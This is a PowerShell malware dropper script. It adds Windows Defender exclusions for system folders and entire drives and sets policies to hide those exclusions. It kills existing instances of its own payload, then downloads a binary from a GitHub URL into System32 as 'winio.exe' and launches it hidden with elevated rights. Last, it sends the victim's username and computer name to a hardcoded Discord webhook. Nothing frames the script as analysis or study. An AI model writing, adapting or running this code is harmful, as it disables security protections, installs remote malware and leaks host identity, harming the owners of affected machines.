    $paths = @(
        "C:\Program Files\Windows Defender",
        "C:\Program Files\Windows Defender Advanced Threat Protection",
        "C:\Program Files\Windows NT",
        "C:\Program Files\Windows Security",
        "C:\Program Files\WindowsPowerShell",

        "C:\Program Files (x86)\Internet Explorer",
        "C:\Program Files (x86)\Microsoft",
        "C:\Program Files (x86\Windows Defender",
        "C:\Program Files (x86)\Windows NT",
        "C:\Program Files (x86)\WindowsPowerShell",

        "C:\Windows\Boot",
        "C:\Windows\SafeBoot",
        "C:\Windows\CSC",
        "C:\Windows\debug",
        "C:\Windows\diagnostics",
        "C:\Windows\Logs",
        "C:\Windows\PLA",
        "C:\Windows\Resources",
        "C:\Windows\security",
        "C:\Windows\System",
        "C:\Windows\System32",
        "C:\Windows\SystemApps",
        "C:\Windows\SystemResources",
        "C:\Windows\SystemTemp",
        "C:\Windows\SysWOW64",
        "C:\Windows\Tasks",
        "C:\Windows\WinSxS",

        [System.IO.Path]::GetTempPath(),
        "C:\",
        "D:\",
    );
    foreach($path in $paths)
    {
        try
        {
            Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue;
        }
        catch
        {
        };
    };

    $keys = @(
        "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\HideExclusionsFromLocalAdmins",
        "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\HideExclusions"
    );
    
    foreach ($key in $keys) 
    {
        try 
        {
            if (-not (Test-Path $key -ErrorAction SilentlyContinue)) 
            {
                New-Item -Path $key -Force -ErrorAction SilentlyContinue | Out-Null;

                New-ItemProperty -Path $key -Name "Default" -Value 1 -PropertyType "DWORD" -Force -ErrorAction SilentlyContinue | Out-Null;
            } 
            else
            {
                Set-ItemProperty -Path $key -Name "Default" -Value 1 -Force -ErrorAction SilentlyContinue;
            };
        } 
        catch 
        {
            continue;
        }
    };
    
    $processPaths = @('C:\Windows\System32\winio.exe', 'C:\Windows\System32\SafeBoot\winio.exe');

    try 
    {
        $processes = Get-WmiObject Win32_Process | Where-Object { $processPaths -contains $_.ExecutablePath };

        if ($processes.Count -eq 0) 
        {
        } 
        else 
        {
            foreach ($process in $processes) 
            {
                try 
                {
                    Stop-Process -Id $process.ProcessId -Force;
                } 
                catch 
                {
                };
            };
        };
    } 
    catch 
    {
    }

    
    $mutexName = "44b6c65a-d844-4fa9-9d68-a7df5ab8b127";

    $processes = Get-WmiObject Win32_Process;

    foreach ($process in $processes) 
    {
        try 
        {
            $processHandle = [System.Diagnostics.Process]::GetProcessById($process.ProcessId);
            $mutex = [System.Threading.Mutex]::OpenExisting($mutexName, [System.Threading.MutexRights]::Synchronize);

            if ($mutex) 
            {
                Stop-Process -Id $process.ProcessId -Force;
                break;
            }
        } 
        catch 
        {
        }
    }

    try 
    {
        $filePath = "C:\\Windows\\System32\\SafeBoot\\winio.exe";
        if (Test-Path $filePath)
        {
            try
            {
                Remove-Item -Path "$filePath" -Force -Recurse -ErrorAction Continue;
            }
            catch
            {
            }
        }

        $filePath2 = "C:\\Windows\\System32\\winio.exe";
        if (Test-Path $filePath2)
        {
            try
            {
                Remove-Item -Path "$filePath2" -Force -Recurse -ErrorAction Continue;
            }
            catch
            {
            }
        }
    } 
    catch 
    {
    }

    try
    {
        Start-BitsTransfer -Source 'https://raw.githubusercontent.com/aodfs/0/main/1' -Destination 'C:\Windows\System32\winio.exe' -ErrorAction SilentlyContinue;
    }
    catch
    {
    }

    try
    {
        if (-not (Test-Path 'C:\Windows\System32\winio.exe'))
        {
            Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/aodfs/0/main/1' -OutFile 'C:\Windows\System32\winio.exe' -ErrorAction SilentlyContinue;
        };
    }
    catch
    {
    }
    
    if (Test-Path "C:\Windows\System32\winio.exe") 
    {
        try 
        {
            Start-Process -FilePath "C:\Windows\System32\winio.exe" -Verb RunAs -WindowStyle Hidden -ErrorAction Stop;
        }
        catch 
        {
            try
            {

                Start-Process -FilePath "C:\Windows\System32\winio.exe" -ErrorAction SilentlyContinue;
            }
            catch
            {
            }
        }
    }
    else 
    {
        try 
        {

            try
            {
                Start-BitsTransfer -Source 'https://raw.githubusercontent.com/aodfs/0/main/1' -Destination 'C:\Windows\System32\winio.exe' -ErrorAction SilentlyContinue;
            }
            catch
            {
            };
        
            try
            {
                if (-not (Test-Path 'C:\Windows\System32\winio.exe'))
                {
                    Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/aodfs/0/main/1' -OutFile 'C:\Windows\System32\winio.exe' -ErrorAction SilentlyContinue;
                };
            }
            catch
            {
            }

            try
            {

                Start-Process -FilePath "C:\Windows\System32\winio.exe" -ErrorAction SilentlyContinue;
            }
            catch
            {
            };
        }
        catch 
        {
        };
    };

# Define the webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1277401036809572475/_pXb-6v9wYFAUxRHWpukoPbaRekI0ehKgaNrL0kBWPB1-m504z1fxkHMQAzpFE9be_cc"

# Get the username and PC name
$user = $env:USERNAME
$pcName = $env:COMPUTERNAME

# Create the message in the format 'user@pc'
$message = "$user@$pcName"

# Create the payload
$payload = @{
    content = $message
} | ConvertTo-Json

# Send the message to the webhook
Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $payload

exit;
